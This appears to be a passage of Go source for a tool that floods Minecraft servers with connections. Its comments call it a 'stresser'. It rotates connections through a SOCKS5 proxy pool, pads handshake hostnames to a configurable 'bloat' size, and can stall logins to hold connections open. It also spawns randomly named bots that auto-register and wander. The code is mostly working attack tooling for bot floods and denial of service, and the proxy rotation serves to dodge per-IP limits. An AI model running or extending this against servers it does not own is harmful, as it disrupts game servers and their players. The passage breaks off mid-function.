package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/spf13/cobra"
	"github.com/spf13/viper"
	"golang.org/x/net/proxy"
)

var (
	activeConns     atomic.Int64
	bytesSent       atomic.Int64
	droppedConns    atomic.Int64
	newConns        atomic.Int64
	proxyCounter    atomic.Uint64
	offlineDetected atomic.Bool

	// Mojang credentials for online-mode auth. If empty, encryption is attempted
	// but Mojang join is skipped — the server will kick with "Failed to verify username!"
	accessToken   string
	playerUUID    string
	login         bool
	prelogin      bool
	har           bool
	stall         bool
	stallDuration time.Duration

	// Movement simulation. Only takes effect once a connection reaches Play
	// state (offline-mode or authenticated online-mode) — the dribble
	// fallback never joins, so there's nothing to move.
	wander         bool
	wanderInterval time.Duration
	wanderStep     float64
)

func stallIfEnabled() {
	if !stall {
		return
	}
	// Add 0-2s jitter to the stall duration
	jitter := time.Duration(rand.Intn(2000)) * time.Millisecond
	time.Sleep(stallDuration + jitter)
}

var proxyPool []string

var (
	// joinGate is a shared rate-limiter channel; workers block here before each
	// new TCP dial. nil means unlimited. Set via --join-delay.
	joinGate chan struct{}

	version = "dev"
	commit  = "none"
	date    = "unknown"
)

// ---------------------------------------------------------------------------
// ANSI colours
// ---------------------------------------------------------------------------

const (
	cReset      = "\033[0m"
	cDim        = "\033[2m"
	cBoldGreen  = "\033[1;32m"
	cBoldCyan   = "\033[1;36m"
	cBoldRed    = "\033[1;31m"
	cBoldYellow = "\033[1;33m"
	cGreen      = "\033[32m"
	cCyan       = "\033[36m"
	cGray       = "\033[90m"
)

func ts() string { return fmt.Sprintf("%s%s%s", cDim, time.Now().Format("15:04:05.000"), cReset) }

func dbgSend(id int, name string, pkt []byte) {
	fmt.Printf("%s %s→ SEND%s  %s0x%02X%s  %-34s %s%6d B%s\n",
		ts(), cBoldGreen, cReset, cGreen, id, cReset, name, cGray, len(pkt), cReset)
}

func dbgRecv(id int, name string, payload []byte) {
	preview := ""
	if n := 16; len(payload) > 0 {
		if len(payload) < n {
			n = len(payload)
		}
		preview = fmt.Sprintf("  %s[% x]%s", cGray, payload[:n], cReset)
	}
	fmt.Printf("%s %s← RECV%s  %s0x%02X%s  %-34s %s%6d B%s%s\n",
		ts(), cBoldCyan, cReset, cCyan, id, cReset, name, cGray, len(payload), cReset, preview)
}

func dbgInfo(format string, args ...interface{}) {
	fmt.Printf("%s         %s%s%s\n", ts(), cGray, fmt.Sprintf(format, args...), cReset)
}

func dbgState(from, to string) {
	fmt.Printf("%s %s[%s → %s]%s\n", ts(), cBoldYellow, from, to, cReset)
}

func dbgOK(msg string) {
	fmt.Printf("%s %s✓%s  %s\n", ts(), cBoldGreen, cReset, msg)
}

func dbgErr(label string, err error) {
	fmt.Printf("%s %s✗%s  %s: %v\n", ts(), cBoldRed, cReset, label, err)
}

// ---------------------------------------------------------------------------
// Rolling 5-line log for Play state (avoids console flood from inbound packets)
// ---------------------------------------------------------------------------

var (
	playRingBuf [5]string
	playRingN   int
	playRingMu  sync.Mutex
)

func fmtRecvLine(id int, name string, payload []byte) string {
	preview := ""
	if len(payload) > 0 {
		n := 16
		if len(payload) < n {
			n = len(payload)
		}
		preview = fmt.Sprintf("  %s[% x]%s", cGray, payload[:n], cReset)
	}
	return fmt.Sprintf("%s %s← RECV%s  %s0x%02X%s  %-34s %s%6d B%s%s",
		ts(), cBoldCyan, cReset, cCyan, id, cReset, name, cGray, len(payload), cReset, preview)
}

func fmtSendLine(id int, name string, pkt []byte) string {
	return fmt.Sprintf("%s %s→ SEND%s  %s0x%02X%s  %-34s %s%6d B%s",
		ts(), cBoldGreen, cReset, cGreen, id, cReset, name, cGray, len(pkt), cReset)
}

func fmtInfoLine(format string, args ...interface{}) string {
	return fmt.Sprintf("%s         %s%s%s", ts(), cGray, fmt.Sprintf(format, args...), cReset)
}

// playLog adds a line to the rolling 5-line Play-state display, overwriting
// the previous entries in place rather than scrolling the terminal.
func playLog(line string) {
	playRingMu.Lock()
	defer playRingMu.Unlock()

	shown := playRingN
	if shown > 5 {
		shown = 5
	}
	if shown > 0 {
		fmt.Printf("\033[%dA", shown) // move cursor up
	}

	if playRingN < 5 {
		playRingBuf[playRingN] = line
		playRingN++
	} else {
		copy(playRingBuf[:], playRingBuf[1:])
		playRingBuf[4] = line
	}

	count := playRingN
	if count > 5 {
		count = 5
	}
	for i := 0; i < count; i++ {
		fmt.Printf("\033[2K%s\n", playRingBuf[i])
	}
}

func isConnRefused(err error) bool {
	var opErr *net.OpError
	if errors.As(err, &opErr) && opErr.Op == "dial" {
		return strings.Contains(opErr.Err.Error(), "connection refused")
	}
	return false
}

func getDialer() (proxy.Dialer, error) {
	baseDialer := &net.Dialer{Timeout: 10 * time.Second}
	if len(proxyPool) == 0 {
		return baseDialer, nil
	}

	var proxyAddr string
	strategy := viper.GetString("proxy-strategy")
	if strategy == "round-robin" {
		counter := proxyCounter.Add(1)
		idx := (counter - 1) % uint64(len(proxyPool))
		proxyAddr = proxyPool[idx]
	} else {
		// default to random
		proxyAddr = proxyPool[rand.Intn(len(proxyPool))]
	}

	return proxy.SOCKS5("tcp", proxyAddr, nil, baseDialer)
}

// ---------------------------------------------------------------------------
// Packet name tables (protocol 767 / 1.21.1)
// ---------------------------------------------------------------------------

func loginSPacketName(id int) string {
	switch id {
	case 0x00:
		return "Disconnect (Login)"
	case 0x01:
		return "Encryption Request"
	case 0x02:
		return "Login Success"
	case 0x03:
		return "Set Compression"
	case 0x04:
		return "Login Plugin Request"
	default:
		return "Unknown"
	}
}

func configSPacketName(id int) string {
	switch id {
	case 0x00:
		return "Cookie Request (Config)"
	case 0x01:
		return "Plugin Message (Config)"
	case 0x02:
		return "Disconnect (Config)"
	case 0x03:
		return "Finish Configuration"
	case 0x04:
		return "Keep Alive (Config)"
	case 0x05:
		return "Ping (Config)"
	case 0x06:
		return "Reset Chat"
	case 0x07:
		return "Registry Data"
	case 0x08:
		return "Remove Resource Pack (Config)"
	case 0x09:
		return "Known Packs"
	case 0x0A:
		return "Store Cookie (Config)"
	case 0x0B:
		return "Transfer (Config)"
	case 0x0C:
		return "Feature Flags"
	case 0x0D:
		return "Update Tags (Config)"
	case 0x0E:
		return "Select Known Packs"
	case 0x0F:
		return "Custom Report Details"
	case 0x10:
		return "Server Links"
	default:
		return "Unknown"
	}
}

func playSPacketName(id int) string {
	switch id {
	case 0x1B, 0x1D:
		return "Disconnect (Play)"
	case 0x26:
		return "Keep Alive"
	case 0x28:
		return "Join Game"
	case 0x3C:
		return "Player Position"
	default:
		return "Unknown"
	}
}

// ---------------------------------------------------------------------------
// Debug runner (single connection, full packet log)
// ---------------------------------------------------------------------------

func debugRun(target string, port uint16, bloatSize int, dribbleInterval time.Duration) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	host := randString(rng, bloatSize)
	name := randString(rng, 16)

	fmt.Printf("\n%s  debug mode  target=%s  bloat=%d  dribble=%s\n\n",
		cBoldYellow, target, bloatSize, dribbleInterval)

	start := time.Now()
	dialer, err := getDialer()
	if err != nil {
		dbgErr("proxy dialer", err)
		return
	}
	conn, err := dialer.Dial("tcp", target)
	if err != nil {
		dbgErr("connect", err)
		return
	}
	defer conn.Close()
	dbgOK(fmt.Sprintf("connected to %s", target))

	// Handshake with the server
	hs := buildHandshake(host, port)
	conn.Write(hs)
	dbgSend(0x00, "Handshake", hs)
	dbgInfo("proto=767  host=%s(%d)  port=%d  next=Login", host[:min(12, len(host))], len(host), port)

	ls := buildLoginStart(name)
	conn.Write(ls)
	dbgSend(0x00, fmt.Sprintf("Login Start  name=%s", name), ls)

	dbgState("Handshake", "Login")

	// Log in state
	compressed := false
	active := net.Conn(conn)

	for {
		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		id, payload, err := readPacket(active, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			dbgErr("read (Login)", err)
			return
		}

		dbgRecv(id, loginSPacketName(id), payload)

		switch id {
		case 0x00: // Disconnect
			dbgInfo("reason: %s", fmtJSON(payload))
			dbgErr("server disconnected", fmt.Errorf("during Login state"))
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x03: // Set Compression
			threshold, _ := decodeVarInt(payload)
			if threshold >= 0 {
				compressed = true
				dbgInfo("compression enabled  threshold=%d", threshold)
			} else {
				compressed = false
				dbgInfo("compression disabled (threshold < 0)")
			}

		case 0x01: // Encryption Request
			serverID, pubKeyDER, verifyToken, shouldAuth, err := parseEncryptionRequest(payload)
			if err != nil {
				dbgErr("parse Encryption Request", err)
				return
			}
			dbgInfo("serverID=%q  pubkey=%d B  verifyToken=%x  shouldAuth=%v",
				serverID, len(pubKeyDER), verifyToken, shouldAuth)

			sharedSecret := make([]byte, 16)
			cryptorand.Read(sharedSecret)
			dbgInfo("sharedSecret=%x", sharedSecret)

			pubAny, err := x509.ParsePKIXPublicKey(pubKeyDER)
			if err != nil {
				dbgErr("parse RSA key", err)
				return
			}
			pubKey := pubAny.(*rsa.PublicKey)
			dbgInfo("RSA key: %d bits", pubKey.N.BitLen())

			encSecret, _ := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, sharedSecret)
			encToken, _ := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, verifyToken)

			if accessToken != "" && playerUUID != "" {
				serverHash := minecraftSHA1([]byte(serverID), sharedSecret, pubKeyDER)
				dbgInfo("serverHash=%s", serverHash)
				dbgInfo("calling Mojang session server…")
				if err := mojangJoin(accessToken, playerUUID, serverHash); err != nil {
					dbgErr("Mojang auth", err)
				} else {
					dbgOK("Mojang auth OK")
				}
			} else {
				dbgInfo("no credentials — skipping Mojang join (expect kick)")
			}

			resp := buildEncryptionResponse(encSecret, encToken)
			conn.Write(resp)
			dbgSend(0x01, "Encryption Response", resp)

			active = enableEncryption(conn, sharedSecret)
			dbgOK("AES/CFB8 encryption enabled")

		case 0x02: // Login Success
			dbgInfo("UUID+name in payload (%d B)", len(payload))
			ack := buildPacket(0x03, nil, compressed)
			active.Write(ack)
			dbgSend(0x03, "Login Acknowledged", ack)
			dbgState("Login", "Configuration")
			debugRunConfig(active, compressed, start)
			return
		}
	}
}

func debugRunConfig(conn net.Conn, compressed bool, start time.Time) {
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			dbgErr("read (Config)", err)
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return
		}

		dbgRecv(id, configSPacketName(id), data)

		switch id {
		case 0x01: // Plugin Message (Config)
			strLen, n := decodeVarInt(data)
			if n+strLen <= len(data) {
				dbgInfo("channel=%s", string(data[n:n+strLen]))
			}

		case 0x07: // Registry Data
			strLen, n := decodeVarInt(data)
			if n+strLen <= len(data) {
				dbgInfo("registry=%s", string(data[n:n+strLen]))
			}

		case 0x0D: // Update Tags (Config)
			dbgInfo("tags update (%d bytes)", len(data))

		case 0x02: // Disconnect (was 0x01)
			dbgInfo("reason: %s", fmtJSON(data))
			fmt.Printf("\n%sheld for %s%s\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x03: // Finish Configuration (was 0x02)
			ack := buildPacket(0x03, nil, compressed)
			conn.Write(ack)
			dbgSend(0x03, "Acknowledge Configuration", ack)
			dbgState("Configuration", "Play")
			debugRunPlay(conn, compressed, start)
			return

		case 0x04: // Keep Alive (was 0x03)
			resp := buildPacket(0x04, data, compressed)
			conn.Write(resp)
			dbgSend(0x04, "Keep Alive Response (Config)", resp)

		case 0x05: // Ping (was 0x04)
			resp := buildPacket(0x05, data, compressed)
			conn.Write(resp)
			dbgSend(0x05, "Pong", resp)

		case 0x0E: // Select Known Packs
			// Respond with 0 known packs
			resp := buildPacket(0x07, []byte{0x00}, compressed)
			conn.Write(resp)
			dbgSend(0x07, "Known Packs", resp)
		}
	}
}

func debugRunPlay(conn net.Conn, compressed bool, start time.Time) {
	dbgOK("Play state reached — holding indefinitely (Ctrl-C to stop)")
	playRingN = 0 // reset rolling display for this session
	kaCount := 0

	var connMu sync.Mutex
	writePacket := func(pkt []byte) error {
		connMu.Lock()
		defer connMu.Unlock()
		_, err := conn.Write(pkt)
		return err
	}

	if login {
		go func() {
			time.Sleep(1000 * time.Millisecond)
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			pass1 := randString(rng, 10)
			pass2 := randString(rng, 10)

			cmd1 := fmt.Sprintf("register %s", pass1)
			pkt1 := buildChatCommand(cmd1, compressed)
			if writePacket(pkt1) == nil {
				playLog(fmtSendLine(0x04, fmt.Sprintf("/%s", cmd1), pkt1))
			}

			cmd2 := fmt.Sprintf("register %s %s", pass2, pass1)
			pkt2 := buildChatCommand(cmd2, compressed)
			if writePacket(pkt2) == nil {
				playLog(fmtSendLine(0x04, fmt.Sprintf("/%s", cmd2), pkt2))
			}
		}()
	}

	var (
		posMu            sync.Mutex
		posX, posY, posZ float64
		havePos          bool
	)

	if wander {
		done := make(chan struct{})
		defer close(done)

		go func() {
			wRng := rand.New(rand.NewSource(time.Now().UnixNano()))
			moveTicker := time.NewTicker(wanderInterval)
			defer moveTicker.Stop()
			respawnTicker := time.NewTicker(10 * time.Second)
			defer respawnTicker.Stop()

			for {
				select {
				case <-done:
					return

				case <-moveTicker.C:
					posMu.Lock()
					ready := havePos
					x, y, z := posX, posY, posZ
					posMu.Unlock()
					if !ready {
						continue
					}
					moved := wRng.Intn(2) == 0
					if moved {
						x += (wRng.Float64()*2 - 1) * wanderStep
						z += (wRng.Float64()*2 - 1) * wanderStep
					}
					pkt := buildPlayerPositionRot(x, y, z, true, compressed)
					if writePacket(pkt) != nil {
						return
					}
					label := "hold"
					if moved {
						label = "move"
					}
					playLog(fmtSendLine(0x1D, fmt.Sprintf("Player Position And Rotation (%s)  x=%.1f z=%.1f", label, x, z), pkt))
					posMu.Lock()
					posX, posZ = x, z
					posMu.Unlock()

				case <-respawnTicker.C:
					pkt := buildClientStatusRespawn(compressed)
					if writePacket(pkt) != nil {
						return
					}
					playLog(fmtSendLine(0x09, "Client Status (respawn)", pkt))
				}
			}
		}()
	}

	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			// EOF is expected immediately after a Disconnect packet — don't log it.
			if err.Error() != "EOF" {
				playLog(fmtInfoLine("read error: %v", err))
			}
			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return
		}

		playLog(fmtRecvLine(id, playSPacketName(id), data))

		switch id {
		case 0x1B, 0x1D: // Disconnect (Play)
			playLog(fmtInfoLine("reason: %s", fmtJSON(data)))
			fmt.Printf("\n%sheld for %s%s\n\n", cGray, time.Since(start).Round(time.Millisecond), cReset)
			return

		case 0x26: // Keep Alive
			kaCount++
			kaID, _ := binary.ReadUvarint(bytes.NewReader(data))
			playLog(fmtInfoLine("id=%d", kaID))
			resp := buildPacket(0x18, data, compressed)
			if writePacket(resp) == nil {
				playLog(fmtSendLine(0x18, fmt.Sprintf("Keep Alive Response  #%d", kaCount), resp))
			}

		case 0x28: // Join Game
			playLog(fmtInfoLine("play start"))

		case 0x3C: // Synchronize Player Position
			playLog(fmtInfoLine("server position/rotation update"))
			if wander {
				if x, y, z, tid, ok := parseSyncPlayerPosition(data); ok {
					ack := buildConfirmTeleport(tid, compressed)
					if writePacket(ack) == nil {
						playLog(fmtSendLine(0x00, fmt.Sprintf("Confirm Teleportation  id=%d", tid), ack))
					}
					posMu.Lock()
					posX, posY, posZ = x, y, z
					havePos = true
					posMu.Unlock()
				}
			}
		}
	}
}

// fmtJSON returns a trimmed string representation of packet payload that is
// likely a JSON chat component (e.g. Disconnect reason).
func fmtJSON(payload []byte) string {
	if len(payload) > 0 && payload[0] == 0x0a {
		// It's NBT. For a stresser, we'll just show hex or a simplified view.
		return fmt.Sprintf("[NBT] %x", payload)
	}
	strLen, n := decodeVarInt(payload)
	if n < len(payload) && strLen > 0 && n+strLen <= len(payload) {
		return string(payload[n : n+strLen])
	}
	return fmt.Sprintf("%x", payload)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Write-side helpers

func writeVarInt(buf []byte, v int) []byte {
	for {
		b := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		buf = append(buf, b)
		if v == 0 {
			break
		}
	}
	return buf
}

func writeString(buf []byte, s string) []byte {
	raw := []byte(s)
	buf = writeVarInt(buf, len(raw))
	return append(buf, raw...)
}

func buildPacket(id int, payload []byte, compressed bool) []byte {
	var data []byte
	data = writeVarInt(data, id)
	data = append(data, payload...)

	if compressed {
		// Wrap in compression header
		var inner []byte
		inner = writeVarInt(inner, 0) // Uncompressed length = 0 (not compressed)
		inner = append(inner, data...)

		var out []byte
		out = writeVarInt(out, len(inner))
		return append(out, inner...)
	} else {
		var out []byte
		out = writeVarInt(out, len(data))
		return append(out, data...)
	}
}

func buildChatCommand(cmd string, compressed bool) []byte {
	var payload []byte
	payload = writeString(payload, cmd)

	// Timestamp (Long)
	t := time.Now().UnixMilli()
	tBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(tBuf, uint64(t))
	payload = append(payload, tBuf...)

	// Salt (Long)
	payload = append(payload, make([]byte, 8)...)

	// Argument Count (VarInt) = 0
	payload = writeVarInt(payload, 0)

	// Message Count (VarInt) = 0
	payload = writeVarInt(payload, 0)

	// Acknowledged Messages (BitSet) = empty (0 VarInt count)
	payload = writeVarInt(payload, 0)

	return buildPacket(0x04, payload, compressed)
}

func buildHandshake(host string, port uint16) []byte {
	var payload []byte
	payload = writeVarInt(payload, 0x00)
	payload = writeVarInt(payload, 767)
	payload = writeString(payload, host)
	portBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(portBuf, port)
	payload = append(payload, portBuf...)
	payload = writeVarInt(payload, 2)
	var out []byte
	out = writeVarInt(out, len(payload))
	return append(out, payload...)
}

func buildLoginStart(name string) []byte {
	var payload []byte
	payload = writeString(payload, name)
	payload = append(payload, make([]byte, 16)...)
	return buildPacket(0x00, payload, false)
}

func buildEncryptionResponse(encSecret, encToken []byte) []byte {
	var data []byte
	data = writeVarInt(data, len(encSecret))
	data = append(data, encSecret...)
	data = append(data, 0x01)
	data = writeVarInt(data, len(encToken))
	data = append(data, encToken...)
	return buildPacket(0x01, data, false)
}

// Movement (wander)
//
// Packet IDs below (Confirm Teleportation 0x00, Client Status 0x09, Player
// Position And Rotation 0x1D) are protocol-767 (1.21.1) serverbound Play IDs
// per public protocol references, cross-checked against the IDs this file
// already relies on elsewhere (Chat Command 0x04, Command Suggestions 0x0B,
// Close Container 0x0F, Keep Alive 0x18 all line up with the same ordering).
// The 0x1D movement ID specifically hasn't been exercised by this codebase
// before now — verify it against a real target with --debug before relying
// on --wander at scale.

func writeFloat64(buf []byte, v float64) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, math.Float64bits(v))
	return append(buf, b...)
}

func writeFloat32(buf []byte, v float32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, math.Float32bits(v))
	return append(buf, b...)
}

func readFloat64(b []byte) float64 {
	return math.Float64frombits(binary.BigEndian.Uint64(b))
}

// parseSyncPlayerPosition decodes the clientbound Synchronize Player Position
// packet: X, Y, Z (float64), Yaw, Pitch (float32), Flags (byte), TeleportId (VarInt).
func parseSyncPlayerPosition(payload []byte) (x, y, z float64, teleportID int, ok bool) {
	const fixed = 8 + 8 + 8 + 4 + 4 + 1
	if len(payload) < fixed {
		return 0, 0, 0, 0, false
	}
	pos := 0
	x = readFloat64(payload[pos:])
	pos += 8
	y = readFloat64(payload[pos:])
	pos += 8
	z = readFloat64(payload[pos:])
	pos += 8
	pos += 4 + 4 // yaw, pitch — unused
	pos += 1     // flags byte
	if pos >= len(payload) {
		return 0, 0, 0, 0, false
	}
	teleportID, _ = decodeVarInt(payload[pos:])
	return x, y, z, teleportID, true
}

// buildConfirmTeleport acknowledges a Synchronize Player Position packet.
// Real servers won't process further movement packets until this is sent.
func buildConfirmTeleport(teleportID int, compressed bool) []byte {
	var payload []byte
	payload = writeVarInt(payload, teleportID)
	return buildPacket(0x00, payload, compressed)
}

// buildPlayerPositionRot sends a serverbound movement update.
func buildPlayerPositionRot(x, y, z float64, onGround bool, compressed bool) []byte {
	var payload []byte
	payload = writeFloat64(payload, x)
	payload = writeFloat64(payload, y)
	payload = writeFloat64(payload, z)
	payload = writeFloat32(payload, 0) // yaw
	payload = writeFloat32(payload, 0) // pitch
	if onGround {
		payload = append(payload, 0x01)
	} else {
		payload = append(payload, 0x00)
	}
	return buildPacket(0x1D, payload, compressed)
}

// buildClientStatusRespawn requests a respawn (action 0). Sent unconditionally
// on a timer rather than parsed off death packets — harmless no-op if the bot
// isn't actually dead, and sidesteps needing exact Combat Death / Set Health IDs.
func buildClientStatusRespawn(compressed bool) []byte {
	var payload []byte
	payload = writeVarInt(payload, 0)
	return buildPacket(0x09, payload, compressed)
}

// Read-side helpers

func readVarInt(r io.Reader) (int, error) {
	var v int
	for shift := uint(0); shift < 21; shift += 7 {
		var b [1]byte
		if _, err := io.ReadFull(r, b[:]); err != nil {
			return 0, err
		}
		v |= int(b[0]&0x7F) << shift
		if b[0]&0x80 == 0 {
			return v, nil
		}
	}
	return 0, fmt.Errorf("VarInt too large")
}

func decodeVarInt(buf []byte) (int, int) {
	var v int
	for i, b := range buf {
		v |= int(b&0x7F) << (7 * uint(i))
		if b&0x80 == 0 {
			return v, i + 1
		}
	}
	return v, len(buf)
}

func readPacket(r io.Reader, compressed bool) (int, []byte, error) {
	length, err := readVarInt(r)
	if err != nil {
		return 0, nil, err
	}
	if length <= 0 || length > 1<<21 {
		return 0, nil, fmt.Errorf("bad packet length %d", length)
	}
	buf := make([]byte, length)
	if _, err := io.ReadFull(r, buf); err != nil {
		return 0, nil, err
	}

	data := buf
	if compressed {
		uLen, n := decodeVarInt(buf)
		if n > len(buf) {
			return 0, nil, fmt.Errorf("truncated compression header")
		}
		if uLen > 0 {
			// Data is compressed
			zr, err := zlib.NewReader(bytes.NewReader(buf[n:]))
			if err != nil {
				return 0, nil, fmt.Errorf("zlib reader: %v", err)
			}
			defer zr.Close()
			data, err = io.ReadAll(zr)
			if err != nil {
				return 0, nil, fmt.Errorf("zlib read: %v", err)
			}
			if len(data) != uLen {
				return 0, nil, fmt.Errorf("zlib size mismatch: got %d, want %d", len(data), uLen)
			}
		} else {
			// Data is uncompressed (wrapped)
			data = buf[n:]
		}
	}

	id, n := decodeVarInt(data)
	return id, data[n:], nil
}

func parseEncryptionRequest(payload []byte) (serverID string, pubKeyDER, verifyToken []byte, shouldAuth bool, err error) {
	idLen, n := decodeVarInt(payload)
	if n+idLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated server ID")
	}
	serverID = string(payload[n : n+idLen])
	pos := n + idLen

	pkLen, n := decodeVarInt(payload[pos:])
	pos += n
	if pos+pkLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated public key")
	}
	pubKeyDER = payload[pos : pos+pkLen]
	pos += pkLen

	vtLen, n := decodeVarInt(payload[pos:])
	pos += n
	if pos+vtLen > len(payload) {
		return "", nil, nil, false, fmt.Errorf("truncated verify token")
	}
	verifyToken = payload[pos : pos+vtLen]
	pos += vtLen

	if pos < len(payload) {
		shouldAuth = payload[pos] != 0
	}
	return
}

// AES/CFB8 encryption

type cfb8Stream struct {
	block cipher.Block
	sr    []byte
	enc   bool
}

func newCFB8(block cipher.Block, iv []byte, enc bool) cipher.Stream {
	sr := make([]byte, block.BlockSize())
	copy(sr, iv)
	return &cfb8Stream{block: block, sr: sr, enc: enc}
}

func (s *cfb8Stream) XORKeyStream(dst, src []byte) {
	tmp := make([]byte, s.block.BlockSize())
	for i := range src {
		s.block.Encrypt(tmp, s.sr)
		dst[i] = src[i] ^ tmp[0]
		copy(s.sr, s.sr[1:])
		if s.enc {
			s.sr[len(s.sr)-1] = dst[i]
		} else {
			s.sr[len(s.sr)-1] = src[i]
		}
	}
}

type cipherConn struct {
	net.Conn
	enc cipher.Stream
	dec cipher.Stream
}

func (c *cipherConn) Read(p []byte) (int, error) {
	n, err := c.Conn.Read(p)
	if n > 0 {
		c.dec.XORKeyStream(p[:n], p[:n])
	}
	return n, err
}

func (c *cipherConn) Write(p []byte) (int, error) {
	enc := make([]byte, len(p))
	c.enc.XORKeyStream(enc, p)
	return c.Conn.Write(enc)
}

func enableEncryption(conn net.Conn, sharedSecret []byte) net.Conn {
	block, _ := aes.NewCipher(sharedSecret)
	return &cipherConn{
		Conn: conn,
		enc:  newCFB8(block, sharedSecret, true),
		dec:  newCFB8(block, sharedSecret, false),
	}
}

// Mojang session auth

func minecraftSHA1(parts ...[]byte) string {
	h := sha1.New()
	for _, p := range parts {
		h.Write(p)
	}
	hash := h.Sum(nil)
	n := new(big.Int).SetBytes(hash)
	if hash[0]&0x80 != 0 {
		n.Sub(n, new(big.Int).Lsh(big.NewInt(1), 160))
	}
	return n.Text(16)
}

var httpClient = &http.Client{Timeout: 10 * time.Second}

// startJoinGate initialises the global rate limiter so that at most one new
// TCP connection is opened per interval across all workers.
func startJoinGate(interval time.Duration) {
	joinGate = make(chan struct{}, 1)
	joinGate <- struct{}{} // first connection is immediate
	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for range ticker.C {
			select {
			case joinGate <- struct{}{}:
			default: // discard the tick if no worker is waiting
			}
		}
	}()
}

func mojangJoin(token, uuid, serverHash string) error {
	body := strings.NewReader(fmt.Sprintf(
		`{"accessToken":%q,"selectedProfile":%q,"serverId":%q}`,
		token, uuid, serverHash,
	))
	resp, err := httpClient.Post(
		"https://sessionserver.mojang.com/session/minecraft/join",
		"application/json",
		body,
	)
	if err != nil {
		return err
	}
	resp.Body.Close()
	if resp.StatusCode != 204 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return nil
}

// Login sequence (production path)

func tryAdvanceToPlay(conn net.Conn, verbose bool) (net.Conn, bool, bool) {
	compressed := false
	active := conn

	for {
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		id, payload, err := readPacket(active, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			return conn, false, false
		}

		switch id {
		case 0x03:
			threshold, _ := decodeVarInt(payload)
			compressed = (threshold >= 0)

		case 0x01:
			serverID, pubKeyDER, verifyToken, _, err := parseEncryptionRequest(payload)
			if err != nil {
				return conn, false, false
			}
			sharedSecret := make([]byte, 16)
			if _, err := cryptorand.Read(sharedSecret); err != nil {
				return conn, false, false
			}
			pubAny, err := x509.ParsePKIXPublicKey(pubKeyDER)
			if err != nil {
				return conn, false, false
			}
			pubKey, ok := pubAny.(*rsa.PublicKey)
			if !ok {
				return conn, false, false
			}
			encSecret, err := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, sharedSecret)
			if err != nil {
				return conn, false, false
			}
			encToken, err := rsa.EncryptPKCS1v15(cryptorand.Reader, pubKey, verifyToken)
			if err != nil {
				return conn, false, false
			}
			if accessToken != "" && playerUUID != "" {
				serverHash := minecraftSHA1([]byte(serverID), sharedSecret, pubKeyDER)
				if err := mojangJoin(accessToken, playerUUID, serverHash); err != nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "\nmojang: %v\n", err)
					}
					return conn, false, false
				}
			}
			resp := buildEncryptionResponse(encSecret, encToken)
			stallIfEnabled()
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			if err != nil {
				return conn, false, false
			}
			bytesSent.Add(int64(len(resp)))
			active = enableEncryption(conn, sharedSecret)

		case 0x02:
			ack := buildPacket(0x03, nil, compressed)
			stallIfEnabled()
			active.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = active.Write(ack)
			active.SetWriteDeadline(time.Time{})
			if err != nil {
				return conn, false, false
			}
			bytesSent.Add(int64(len(ack)))
			ok := drainConfig(active, compressed, verbose)
			return active, ok, compressed

		default:
			return conn, false, false
		}
	}
}

func drainConfig(conn net.Conn, compressed bool, verbose bool) bool {
	for {
		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		id, data, err := readPacket(conn, compressed)
		conn.SetReadDeadline(time.Time{})
		if err != nil {
			return false
		}
		switch id {
		case 0x02: // Disconnect
			return false
		case 0x03: // Finish Configuration (was 0x02)
			ack := buildPacket(0x03, nil, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = conn.Write(ack)
			conn.SetWriteDeadline(time.Time{})
			if err != nil {
				return false
			}
			bytesSent.Add(int64(len(ack)))
			return true
		case 0x04: // Keep Alive (was 0x03)
			resp := buildPacket(0x04, data, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))
		case 0x05: // Ping (was 0x04)
			resp := buildPacket(0x05, data, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write(resp)
			conn.SetWriteDeadline(time.Time{})
			bytesSent.Add(int64(len(resp)))

		case 0x0E: // Select Known Packs
			resp := buildPacket(0x07, []byte{0x00}, compressed)
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
